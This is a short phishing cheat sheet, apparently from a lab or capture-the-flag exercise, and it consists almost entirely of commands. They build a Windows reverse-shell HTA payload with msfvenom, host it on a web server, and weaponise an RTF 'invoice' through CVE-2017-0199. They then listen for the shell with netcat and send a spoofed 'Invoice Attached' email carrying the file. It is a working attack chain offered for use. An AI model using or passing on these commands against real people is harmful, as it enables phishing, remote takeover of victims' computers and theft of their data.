##### Simple Phishing method

Using Microsoft Office as example:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.64 LPORT=4444 -f hta-psh -o hello.hta
sudo python2 -m SimpleHTTPServer 80

sudo python2 cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.64/hello.hta -t rtf -x 0

sudo nc -vlnp 4444

sudo sendEmail -f root@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s $(cat ip) -v
```


